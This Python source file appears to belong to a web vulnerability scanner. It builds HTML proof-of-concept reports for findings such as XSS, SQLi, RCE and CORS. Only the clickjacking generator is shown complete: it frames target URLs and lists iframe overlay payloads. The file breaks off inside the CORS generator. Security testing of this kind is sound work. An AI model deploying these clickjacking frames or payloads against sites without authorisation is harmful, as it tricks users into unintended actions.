import os
import sys
import time
import html
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from PIL import Image
import base64
import concurrent.futures
import threading
from tqdm import tqdm

class PoCGenerator:
    def __init__(self, output_dir="output", max_workers=4, screenshot_timeout=30):
        """Inicializa el generador de PoCs"""
        self.output_dir = output_dir
        self.poc_dir = os.path.join(output_dir, "poc")
        self.screenshots_dir = os.path.join(output_dir, "screenshots")
        self.max_workers = max_workers
        self.screenshot_timeout = screenshot_timeout
        
        # Crear directorios solo si no existen
        os.makedirs(self.poc_dir, exist_ok=True)
        # NO crear screenshots_dir automáticamente
        
        # Inicializar pool de drivers solo si se necesita
        self.driver_pool = []
        self.driver_lock = threading.Lock()
        
        # Configurar Chrome options
        self.chrome_options = webdriver.ChromeOptions()
        self.chrome_options.add_argument('--no-sandbox')
        self.chrome_options.add_argument('--disable-dev-shm-usage')
        self.chrome_options.add_argument('--disable-gpu')
        self.chrome_options.add_argument('--window-size=1920,1080')
        self.chrome_options.add_argument('--start-maximized')
    
    def _escape_url_for_js(self, url):
        """Escapa una URL para uso seguro en JavaScript"""
        import html
        # Escapar caracteres HTML y JavaScript
        escaped = html.escape(url)
        # Reemplazar comillas simples y dobles
        escaped = escaped.replace("'", "\\'").replace('"', '\\"')
        return escaped
    
    def _generate_url_options(self, urls):
        """Genera las opciones del dropdown para las URLs"""
        if not urls:
            return '<option value="">No URLs available</option>'
        
        options = []
        for i, url in enumerate(urls):
            escaped_url = self._escape_url_for_js(url)
            # Truncar URL para mostrar en el dropdown
            display_url = url[:60] + "..." if len(url) > 60 else url
            options.append(f'<option value="{escaped_url}">{display_url}</option>')
        
        return '\n'.join(options)
    
    def _init_driver_pool(self):
        """Inicializa un pool de drivers de Chrome para paralelización"""
        try:
            for _ in range(self.max_workers):
                driver = webdriver.Chrome(options=self.chrome_options)
                driver.set_page_load_timeout(self.screenshot_timeout)
                driver.implicitly_wait(5)
                self.driver_pool.append(driver)
            sys.stdout.write(f"✅ Pool de {self.max_workers} drivers inicializado\n")
            sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f"⚠️ Error inicializando drivers: {e}\n")
            sys.stdout.flush()
            sys.stdout.write("💡 Continuando con generación de PoCs sin screenshots...\n")
            sys.stdout.flush()
    
    def _get_driver(self):
        """Obtiene un driver disponible del pool"""
        with self.driver_lock:
            if self.driver_pool:
                return self.driver_pool.pop()
            return None
    
    def _return_driver(self, driver):
        """Devuelve un driver al pool"""
        try:
            driver.delete_all_cookies()
            with self.driver_lock:
                self.driver_pool.append(driver)
        except:
            pass  # Si falla, simplemente descartamos el driver
    
    def generate_pocs_batch(self, vulnerabilities, target_url):
        """Genera PoCs en paralelo para múltiples vulnerabilidades"""
        if not vulnerabilities:
            return []
        
        sys.stdout.write(f"\n🚀 Generando {len(vulnerabilities)} PoCs en paralelo...\n")
        sys.stdout.flush()
        
        # Crear tareas para ejecución paralela
        tasks = []
        for vuln in vulnerabilities:
            if isinstance(vuln, str) and vuln.startswith('[VULNERABLE'):
                task = self._create_poc_task(vuln, target_url)
                if task:
                    tasks.append(task)
        
        if not tasks:
            sys.stdout.write("ℹ️ No se encontraron vulnerabilidades compatibles para PoC\n")
            sys.stdout.flush()
            return []
        
        # Ejecutar en paralelo con barra de progreso
        results = []
        with tqdm(total=len(tasks), desc="Generando PoCs", unit="PoC") as pbar:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                future_to_task = {executor.submit(task['func'], *task['args']): task for task in tasks}
                
                for future in concurrent.futures.as_completed(future_to_task):
                    task = future_to_task[future]
                    try:
                        result = future.result(timeout=30)  # Timeout por PoC individual
                        if result:
                            results.append(result)
                            pbar.set_postfix_str(f"✅ {task['type']}")
                        else:
                            pbar.set_postfix_str(f"❌ {task['type']}")
                    except Exception as e:
                        pbar.set_postfix_str(f"❌ {task['type']} - {str(e)[:20]}")
                    finally:
                        pbar.update(1)
        
        sys.stdout.write(f"\n🎉 Generación completada: {len(results)}/{len(tasks)} PoCs exitosos\n")
        sys.stdout.flush()
        return results
    
    def _create_poc_task(self, vuln, target_url):
        """Crea una tarea para generar un PoC específico"""
        try:
            if "VULNERABLE TO CLICKJACKING" in vuln:
                url = vuln.replace('[VULNERABLE TO CLICKJACKING] ', '')
                return {
                    'func': self.generate_clickjacking_poc,
                    'args': (url,),
                    'type': 'Clickjacking'
                }
            elif "VULNERABLE TO XSS" in vuln:
                method, url, form_data = self._extract_vuln_info(vuln, 'XSS')
                return {
                    'func': self.generate_xss_poc,
                    'args': (url, method, form_data),
                    'type': 'XSS'
                }
            elif "VULNERABLE TO LFI" in vuln:
                method, url, _ = self._extract_vuln_info(vuln, 'LFI')
                return {
                    'func': self.generate_lfi_poc,
                    'args': (url, method),
                    'type': 'LFI'
                }
            elif "VULNERABLE TO SQLI" in vuln:
                method, url, form_data = self._extract_vuln_info(vuln, 'SQLI')
                return {
                    'func': self.generate_sqli_poc,
                    'args': (url, method, form_data),
                    'type': 'SQLi'
                }
            elif "VULNERABLE TO RCE" in vuln:
                method, url, _ = self._extract_vuln_info(vuln, 'RCE')
                return {
                    'func': self.generate_rce_poc,
                    'args': (url, method),
                    'type': 'RCE'
                }
            elif "VULNERABLE TO SSRF" in vuln:
                method, url, _ = self._extract_vuln_info(vuln, 'SSRF')
                return {
                    'func': self.generate_ssrf_poc,
                    'args': (url, method),
                    'type': 'SSRF'
                }
            elif "VULNERABLE TO SSTI" in vuln:
                method, url, form_data = self._extract_vuln_info(vuln, 'SSTI')
                return {
                    'func': self.generate_ssti_poc,
                    'args': (url, method, form_data),
                    'type': 'SSTI'
                }
            elif "VULNERABLE TO XXE" in vuln:
                method, url, _ = self._extract_vuln_info(vuln, 'XXE')
                return {
                    'func': self.generate_xxe_poc,
                    'args': (url, method),
                    'type': 'XXE'
                }
            elif "VULNERABLE TO CRLF" in vuln:
                method, url, _ = self._extract_vuln_info(vuln, 'CRLF')
                return {
                    'func': self.generate_crlf_poc,
                    'args': (url, method),
                    'type': 'CRLF'
                }
            elif "VULNERABLE TO CORS" in vuln:
                # Extraer la URL correctamente para vulnerabilidades CORS
                if '[GET]' in vuln:
                    url = vuln.replace('[VULNERABLE TO CORS] [GET] ', '').strip()
                elif '[POST]' in vuln:
                    url = vuln.replace('[VULNERABLE TO CORS] [POST] ', '').strip()
                elif '[FORM]' in vuln:
                    url = vuln.replace('[VULNERABLE TO CORS] [FORM] ', '').strip()
                else:
                    url = vuln.replace('[VULNERABLE TO CORS] ', '').strip()
                
                # Limpiar la URL de cualquier prefijo restante
                url = url.replace('[GET] ', '').replace('[POST] ', '').replace('[FORM] ', '')
                
                return {
                    'func': self.generate_cors_poc,
                    'args': (url,),
                    'type': 'CORS'
                }
            elif "VULNERABLE TO OPENREDIRECT" in vuln:
                method, url, _ = self._extract_vuln_info(vuln, 'OPENREDIRECT')
                return {
                    'func': self.generate_redirect_poc,
                    'args': (url, method),
                    'type': 'Redirect'
                }
        except Exception as e:
            sys.stdout.write(f"⚠️ Error creando tarea para {vuln[:50]}...: {e}\n")
            sys.stdout.flush()
        
        return None
    
    def _extract_vuln_info(self, vuln, vuln_type):
        """Extrae información de la vulnerabilidad (método, URL, form_data)"""
        try:
            method = "GET"  # Default
            url = ""
            form_data = {}
            
            if '[FORM]' in vuln:
                method = "POST"
                # Extraer la URL correctamente para vulnerabilidades de formulario
                url_part = vuln.replace(f'[VULNERABLE TO {vuln_type}] [FORM] ', '')
                if ' => ' in url_part:
                    url = url_part.split(' => ')[0].strip()
                    form_part = url_part.split(' => ')[1].strip()
                    try:
                        import ast
                        form_data = ast.literal_eval(form_part)
                    except:
                        form_data = {}
                else:
                    url = url_part.strip()
            elif '[GET]' in vuln:
                method = "GET"
                url = vuln.replace(f'[VULNERABLE TO {vuln_type}] [GET] ', '').strip()
            elif '[POST]' in vuln:
                method = "POST"
                url = vuln.replace(f'[VULNERABLE TO {vuln_type}] [POST] ', '').strip()
            else:
                url = vuln.replace(f'[VULNERABLE TO {vuln_type}] ', '').strip()
            
            # Limpiar la URL de caracteres problemáticos para JavaScript
            url = url.replace("'", "\\'").replace('"', '\\"')
            
            return method, url, form_data
        except Exception as e:
            sys.stdout.write(f"⚠️ Error extrayendo info de {vuln_type}: {e}\n")
            sys.stdout.flush()
            return "GET", "", {}
    
    def cleanup(self):
        """Limpia los drivers del pool"""
        for driver in self.driver_pool:
            try:
                driver.quit()
            except:
                pass
        self.driver_pool.clear()

    def _capture_url_screenshot(self, url, filename, headless=True):
        """Captura screenshot de una URL específica"""
        # Solo crear carpeta screenshots si se necesita
        if not os.path.exists(self.screenshots_dir):
            os.makedirs(self.screenshots_dir, exist_ok=True)
            
        driver = None
        try:
            # Configurar opciones según el tipo de captura
            options = webdriver.ChromeOptions()
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--start-maximized')
            
            if headless:
                options.add_argument('--headless')
            
            driver = webdriver.Chrome(options=options)
            driver.set_page_load_timeout(self.screenshot_timeout)
            
            # Navegar a la URL
            driver.get(url)
            time.sleep(2)  # Esperar a que cargue
            
            # Scroll al top para mostrar URL bar
            driver.execute_script("window.scrollTo(0, 0);")
            
            # Capturar screenshot
            screenshot_path = os.path.join(self.screenshots_dir, filename)
            driver.save_screenshot(screenshot_path)
            
            return screenshot_path
            
        except Exception as e:
            sys.stdout.write(f"❌ Error capturando screenshot: {e}\n")
            sys.stdout.flush()
            # Crear screenshot de fallback
            return self._create_fallback_screenshot(filename, url, str(e))
        finally:
            if driver:
                driver.quit()
    
    def _create_fallback_screenshot(self, filename, url="", error_msg="Screenshot failed"):
        """Crea un screenshot básico cuando falla la captura real"""
        try:
            from PIL import Image, ImageDraw, ImageFont
            
            # Solo crear carpeta screenshots si se necesita
            if not os.path.exists(self.screenshots_dir):
                os.makedirs(self.screenshots_dir, exist_ok=True)
            
            screenshot_path = os.path.join(self.screenshots_dir, filename)
            
            # Crear imagen básica
            img = Image.new('RGB', (800, 600), color='white')
            draw = ImageDraw.Draw(img)
            
            # Agregar texto informativo
            draw.text((50, 50), f"URL: {url[:100] if url else 'N/A'}...", fill='black')
            draw.text((50, 100), f"Error: {error_msg[:100]}...", fill='red')
            draw.text((50, 150), "Screenshot falló - PoC HTML generado correctamente", fill='blue')
            
            img.save(screenshot_path)
            return screenshot_path
        except Exception as e:
            sys.stdout.write(f"⚠️ Error creando screenshot de fallback: {e}\n")
            sys.stdout.flush()
            # Si todo falla, crear archivo vacío
            try:
                if not os.path.exists(self.screenshots_dir):
                    os.makedirs(self.screenshots_dir, exist_ok=True)
                screenshot_path = os.path.join(self.screenshots_dir, filename)
                with open(screenshot_path, 'w') as f:
                    f.write(f"Error: {error_msg}")
                return screenshot_path
            except:
                return None
    
    def generate_clickjacking_poc(self, vulnerable_urls, screenshot=False, domain=None):
        """Genera PoC para Clickjacking con múltiples URLs vulnerables"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
            else:
                base_domain = "unknown"
        
        # Limpiar el dominio para usar en el nombre del archivo
        clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_')
        
        # Crear nombre de archivo basado en el dominio
        html_filename = f"{clean_domain}_clickjacking.html"
        
        # Procesar las URLs vulnerables
        import json
        vuln_data = []
        for i, vuln_url in enumerate(vulnerable_urls):
            vuln_data.append({
                'index': i,
                'method': 'GET',
                'url': vuln_url,
                'payload': 'Missing X-Frame-Options and Content-Security-Policy',
                'form_data': None
            })
        
        # Generar opciones del dropdown
        dropdown_options = []
        for vuln in vuln_data:
            display_url = vuln['url'][:60] + "..." if len(vuln['url']) > 60 else vuln['url']
            option_text = f"{vuln['method']} - {display_url}"
            dropdown_options.append(f'<option value="{vuln["index"]}">{option_text}</option>')
        
        dropdown_html = '\n'.join(dropdown_options)
        
        # Sanitizar las URLs en vuln_data para evitar que rompan el JavaScript
        import html
        for vuln in vuln_data:
            # Escapar caracteres HTML pero mantener la URL funcional para el iframe
            vuln['url'] = vuln['url']
            vuln['payload'] = html.escape(str(vuln['payload']))
        
        # Generar JSON de forma segura escapando </script>
        vuln_data_json = json.dumps(vuln_data).replace('</script>', '<\\/script>').replace('</SCRIPT>', '<\\/SCRIPT>')
        
        # Generar el HTML del PoC
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Vulnerability PoC</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }}
        .header {{
            background: #e74c3c;
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .dropdown {{
            width: 100%;
            padding: 12px;
            border: 2px solid #bdc3c7;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 20px;
            background: #f8f9fa;
        }}
        .button {{
            background: #3498db;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
        }}
        .button:hover {{
            background: #2980b9;
            transform: translateY(-2px);
        }}
        .button:disabled {{
            background: #bdc3c7;
            cursor: not-allowed;
            transform: none;
        }}
        .result {{
            background: #f8f9fa;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
            border: 2px solid #f39c12;
            display: none;
        }}
        .vuln-info {{
            background: #ecf0f1;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            display: none;
        }}
        .url-box {{
            background: #2c3e50;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-family: monospace;
            word-break: break-all;
            display: none;
        }}
        .method-badge {{
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: bold;
            margin-right: 8px;
        }}
        .method-get {{
            background: #27ae60;
            color: white;
        }}
        .method-post {{
            background: #e67e22;
            color: white;
        }}
        .payload-box {{
            background: #e74c3c;
            color: white;
            padding: 5px;
            border-radius: 3px;
            font-family: monospace;
            margin: 5px 0;
        }}
        .clickjacking-payload {{
            background: #34495e;
            color: #ecf0f1;
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            margin: 10px 0;
            border-left: 4px solid #e74c3c;
        }}
        .analysis {{
            background: #f39c12;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            display: none;
        }}
        .details {{
            background: #8e44ad;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            display: none;
        }}
        .iframe-container {{
            position: relative;
            width: 100%;
            height: 400px;
            border: 2px solid #e74c3c;
            border-radius: 8px;
            margin: 20px 0;
            overflow: hidden;
        }}
        .iframe-overlay {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(231, 76, 60, 0.1);
            border: 2px dashed #e74c3c;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: bold;
            color: #e74c3c;
        }}
        .iframe-content {{
            width: 100%;
            height: 100%;
            border: none;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 Clickjacking Vulnerability PoC</h1>
        <p>Target: <strong>{base_domain}</strong></p>
        <p>Found <strong>{len(vuln_data)}</strong> clickjacking vulnerabilities</p>
    </div>
    
    <div class="container">
        <div>
            <h3>🔍 Select Vulnerability to Test</h3>
            <select class="dropdown" id="vulnSelect" onchange="selectVulnerability()">
                <option value="">Choose a vulnerability...</option>
                {dropdown_html}
            </select>
        </div>
        
        <div style="text-align: center; margin: 20px 0;">
            <button class="button" onclick="openInNewTab()" id="openBtn" disabled>🔗 Open in New Tab</button>
            <button class="button" onclick="copyUrl()" id="copyBtn" disabled>📋 Copy URL</button>
            <button class="button" onclick="showAnalysis()" id="analysisBtn">📊 Show Analysis</button>
            <button class="button" onclick="showDetails()" id="detailsBtn">🔧 Technical Details</button>
        </div>
        
        <div class="vuln-info" id="vulnInfo">
            <h3>🎯 Selected Vulnerability</h3>
            <div id="vulnDetails"></div>
        </div>
        
        <div class="url-box" id="urlBox">
            <strong>URL to test:</strong>
            <div id="selectedUrl"></div>
        </div>
        
        <div class="iframe-container" id="iframeContainer" style="display: none;">
            <div class="iframe-overlay">
                Clickjacking Attack Demo
            </div>
            <iframe class="iframe-content" id="attackFrame"></iframe>
        </div>
        
        <div class="result" id="result">
            Select a vulnerability from the dropdown above to start testing...
        </div>
        
        <div class="analysis" id="analysis">
            <h3>🔍 Clickjacking Vulnerability Analysis</h3>
            <p><strong>What is Clickjacking?</strong></p>
            <p>Clickjacking is an attack that tricks users into clicking on something different from what they perceive. Attackers overlay invisible or disguised elements on top of legitimate content.</p>
            
            <p><strong>How this attack works:</strong></p>
            <ul>
                <li>1. Attacker creates a malicious page with an invisible iframe</li>
                <li>2. The iframe loads the target vulnerable page</li>
                <li>3. Attacker positions the iframe to overlay buttons/links</li>
                <li>4. User thinks they're clicking on one thing but actually clicks on the iframe</li>
                <li>5. This can lead to unintended actions like transferring money, changing settings, etc.</li>
            </ul>
            
            <p><strong>Common payloads:</strong></p>
            <div class="clickjacking-payload">&lt;iframe src="TARGET_URL" style="opacity:0.1; position:absolute; top:0; left:0; width:100%; height:100%;"&gt;&lt;/iframe&gt;</div>
            <div class="clickjacking-payload">&lt;iframe src="TARGET_URL" style="position:absolute; top:0; left:0; width:100%; height:100%; z-index:999;"&gt;&lt;/iframe&gt;</div>
            <div class="clickjacking-payload">&lt;iframe src="TARGET_URL" style="opacity:0.5; position:fixed; top:0; left:0; width:100%; height:100%;"&gt;&lt;/iframe&gt;</div>
            
            <p><strong>Technical Details:</strong></p>
            <ul>
                <li>• <strong>Attack Vector:</strong> UI Redressing</li>
                <li>• <strong>Missing Headers:</strong> X-Frame-Options, Content-Security-Policy</li>
                <li>• <strong>Risk Level:</strong> Medium</li>
                <li>• <strong>Impact:</strong> Unauthorized user actions</li>
            </ul>
        </div>
        
        <div class="details" id="details">
            <h3>📊 Vulnerability Details</h3>
            <p><strong>Total Vulnerabilities Found:</strong> {len(vuln_data)}</p>
            <p><strong>Target Domain:</strong> {base_domain}</p>
            <p><strong>Scan Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            
            <h4>Vulnerability Breakdown:</h4>
            <ul>
                <li><strong>GET Requests:</strong> {len([v for v in vuln_data if v['method'] == 'GET'])}</li>
            </ul>
            
            <h4>Detection Methods:</h4>
            <ul>
                <li>• Check for missing X-Frame-Options header</li>
                <li>• Test with iframe embedding</li>
                <li>• Verify Content Security Policy frame-ancestors directive</li>
            </ul>
            
            <p><strong>Risk Level:</strong> Medium - Can lead to unintended user actions</p>
        </div>
    </div>

    <script>
        const vulnerabilities = {vuln_data_json};
        let selectedVuln = null;
        
        function selectVulnerability() {{
            const select = document.getElementById('vulnSelect');
            const vulnInfo = document.getElementById('vulnInfo');
            const vulnDetails = document.getElementById('vulnDetails');
            const urlBox = document.getElementById('urlBox');
            const selectedUrl = document.getElementById('selectedUrl');
            const openBtn = document.getElementById('openBtn');
            const copyBtn = document.getElementById('copyBtn');
            const iframeContainer = document.getElementById('iframeContainer');
            const attackFrame = document.getElementById('attackFrame');
            
            if (select.value === '') {{
                vulnInfo.style.display = 'none';
                urlBox.style.display = 'none';
                iframeContainer.style.display = 'none';
                openBtn.disabled = true;
                copyBtn.disabled = true;
                selectedVuln = null;
                return;
            }}
            
            const vulnIndex = parseInt(select.value);
            selectedVuln = vulnerabilities[vulnIndex];
            
            // Mostrar detalles de la vulnerabilidad
            vulnDetails.innerHTML = `
                <div class="method-badge method-${{selectedVuln.method.toLowerCase()}}">${{selectedVuln.method}}</div>
                <strong>URL:</strong> ${{selectedVuln.url}}<br><br>
                <strong>Payload:</strong><br>
                <div class="payload-box">${{selectedVuln.payload}}</div>
            `;
            
            selectedUrl.textContent = selectedVuln.url;
            
            // Actualizar iframe
            attackFrame.src = selectedVuln.url;
            
            vulnInfo.style.display = 'block';
            urlBox.style.display = 'block';
            iframeContainer.style.display = 'block';
            openBtn.disabled = false;
            copyBtn.disabled = false;
        }}
        
        function openInNewTab() {{
            if (selectedVuln) {{
                // Sanitizar la URL para evitar inyección - usar encodeURIComponent para mayor seguridad
                let targetUrl = String(selectedVuln.url);
                // Escapar caracteres especiales que podrían romper el HTML/JavaScript
                targetUrl = targetUrl.replace(/\\\\/g, '\\\\\\\\').replace(/'/g, '\\\\\\'').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
                
                const demoWindow = window.open('', '_blank', 'width=1400,height=900,scrollbars=yes,resizable=yes');
                if (demoWindow) {{
                    // Usar template literal con escape seguro
                    const htmlContent = '<!DOCTYPE html>' +
                        '<html lang=\\'en-US\\'>' +
                        '<head>' +
                        '<meta charset=\\'UTF-8\\'>' +
                        '<meta name=\\'viewport\\' content=\\'width=device-width, initial-scale=1.0\\'>' +
                        '<title>Clickjacking Attack Demonstration</title>' +
                        '<style>' +
                        '* {{ margin: 0; padding: 0; box-sizing: border-box; }}' +
                        'body {{ font-family: \\'Segoe UI\\', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }}' +
                        '.demo-container {{ max-width: 1400px; margin: 0 auto; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); overflow: hidden; }}' +
                        '.demo-header {{ background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); color: white; padding: 25px; text-align: center; }}' +
                        '.demo-header h1 {{ font-size: 28px; margin-bottom: 10px; }}' +
                        '.demo-header p {{ font-size: 16px; opacity: 0.9; }}' +
                        '.demo-content {{ padding: 30px; }}' +
                        '.vulnerable-banner {{ position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(231, 76, 60, 0.95); color: white; padding: 30px 50px; border-radius: 15px; font-size: 24px; font-weight: bold; text-align: center; z-index: 1000; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 4px solid white; }}' +
                        '.vulnerable-banner p {{ margin: 10px 0; }}' +
                        '.iframe-wrapper {{ position: relative; width: 100%; height: 700px; border: 3px solid #e74c3c; border-radius: 10px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.2); background: #f8f9fa; }}' +
                        '.iframe-label {{ position: absolute; top: 10px; left: 10px; background: rgba(231, 76, 60, 0.9); color: white; padding: 8px 15px; border-radius: 5px; font-size: 14px; font-weight: bold; z-index: 10; pointer-events: none; }}' +
                        '.iframe-content {{ width: 100%; height: 100%; border: none; display: block; }}' +
                        '.url-display {{ background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 8px; font-family: \\'Courier New\\', monospace; word-break: break-all; margin: 15px 0; font-size: 14px; }}' +
                        '</style>' +
                        '</head>' +
                        '<body>' +
                        '<div class=\\'vulnerable-banner\\'>' +
                        '<p>⚠️ VULNERABLE TO CLICKJACKING ⚠️</p>' +
                        '<p style=\\'font-size: 18px;\\'>This site can be embedded in an iframe</p>' +
                        '</div>' +
                        '<div class=\\'demo-container\\'>' +
                        '<div class=\\'demo-header\\'>' +
                        '<h1>🚨 Clickjacking Attack Demonstration</h1>' +
                        '<p>Interactive PoC - Navigate the vulnerable site below</p>' +
                        '</div>' +
                        '<div class=\\'demo-content\\'>' +
                        '<div class=\\'url-display\\'>' +
                        '<strong>Target URL:</strong> ' + targetUrl +
                        '</div>' +
                        '<div class=\\'iframe-wrapper\\'>' +
                        '<div class=\\'iframe-label\\'>🔒 Vulnerable Site (Embedded in iframe)</div>' +
                        '<iframe id=\\'vulnerableFrame\\' class=\\'iframe-content\\' src=\\'' + String(selectedVuln.url).replace(/'/g, '\\\\\\'') + '\\' sandbox=\\'allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation\\' allow=\\'fullscreen\\'></iframe>' +
                        '</div>' +
                        '</div>' +
                        '</div>' +
                        '<script>' +
                        'setTimeout(function() {{' +
                        '  var banner = document.querySelector(\\'.vulnerable-banner\\');' +
                        '  if (banner) banner.style.display = \\'none\\';' +
                        '}}, 3000);' +
                        '<\\/script>' +
                        '</body>' +
                        '</html>';
                    
                    demoWindow.document.write(htmlContent);
                    demoWindow.document.close();
                }} else {{
                    alert('Please allow popups to view the demonstration');
                }}
            }}
        }}
        
        function copyUrl() {{
            if (selectedVuln) {{
                navigator.clipboard.writeText(selectedVuln.url).then(function() {{
                    const button = event.target;
                    const originalText = button.textContent;
                    button.textContent = '✅ Copied!';
                    setTimeout(() => {{
                        button.textContent = originalText;
                    }}, 2000);
                }}).catch(function(err) {{
                    console.error('Error copying URL: ', err);
                    const textArea = document.createElement('textarea');
                    textArea.value = selectedVuln.url;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                }});
            }}
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            analysis.style.display = analysis.style.display === 'none' ? 'block' : 'none';
        }}
        
        function showDetails() {{
            const details = document.getElementById('details');
            details.style.display = details.style.display === 'none' ? 'block' : 'none';
        }}
    </script>
</body>
</html>"""
        
        # Guardar el archivo HTML (usar el nombre basado en dominio ya definido arriba)
        html_path = os.path.join("output", "poc", html_filename)
        
        # Crear directorio si no existe
        os.makedirs(os.path.dirname(html_path), exist_ok=True)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }
    
    def generate_cors_poc(self, vulnerable_urls, vulnerability_type="cors", screenshot=False, domain=None):
        """Genera PoC para CORS vulnerability con múltiples URLs vulnerables"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Extraer el dominio base de la primera URL
        from urllib.parse import urlparse
        if vulnerable_urls:
            base_domain = urlparse(vulnerable_urls[0]).netloc
            # Limpiar el dominio para usar como nombre de archivo
            clean_domain = base_domain.replace('www.', '').replace('.', '_')
        else:
            base_domain = "unknown"
            clean_domain = "unknown"
        
        # Crear nombre de archivo con formato: dominio_vulnerabilidad_timestamp.html
                # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
            clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_')
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
                clean_domain = base_domain.replace('www.', '').replace('.', '_')
            else:
                base_domain = "unknown"
                clean_domain = "unknown"
        
        # Crear nombre de archivo basado en el dominio
        html_filename = f"{clean_domain}_cors.html"
        
        # Procesar las URLs vulnerables
        import json
        vuln_data = []
        for i, vuln_url in enumerate(vulnerable_urls):
            vuln_data.append({
                'index': i,
                'method': 'GET',
                'url': vuln_url,
                'payload': 'CORS misconfiguration detected',
                'form_data': None
            })
        
        # Generar opciones del dropdown
        dropdown_options = []
        for vuln in vuln_data:
            display_url = vuln['url'][:60] + "..." if len(vuln['url']) > 60 else vuln['url']
            option_text = f"{vuln['method']} - {display_url}"
            dropdown_options.append(f'<option value="{vuln["index"]}">{option_text}</option>')
        
        dropdown_html = '\n'.join(dropdown_options)
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>CORS Vulnerability PoC - {base_domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #e74c3c; color: white; padding: 20px; border-radius: 5px; text-align: center; }}
        .url-box {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #e74c3c; }}
        .button {{ background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }}
        .button:hover {{ background: #2980b9; }}
        .button:disabled {{ background: #bdc3c7; cursor: not-allowed; }}
        .result {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border: 2px solid #f39c12; }}
        .dropdown-container {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #3498db; }}
        .dropdown {{ width: 100%; padding: 10px; border: 1px solid #bdc3c7; border-radius: 5px; font-size: 14px; }}
        .vuln-info {{ background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #28a745; }}
        .method-badge {{ display: inline-block; padding: 4px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; margin-right: 10px; }}
        .method-get {{ background: #27ae60; color: white; }}
        .method-post {{ background: #e74c3c; color: white; }}
        .payload-box {{ background: #e74c3c; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; }}
        .cors-payload {{ background: #e74c3c; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 CORS Vulnerability PoC</h1>
        <p>Target: <strong>{base_domain}</strong></p>
        <p>Found <strong>{len(vulnerable_urls)}</strong> CORS vulnerabilities</p>
    </div>
    
    <div class="dropdown-container">
        <h3>🔍 Select Vulnerability to Test</h3>
        <select class="dropdown" id="vulnSelect" onchange="selectVulnerability()">
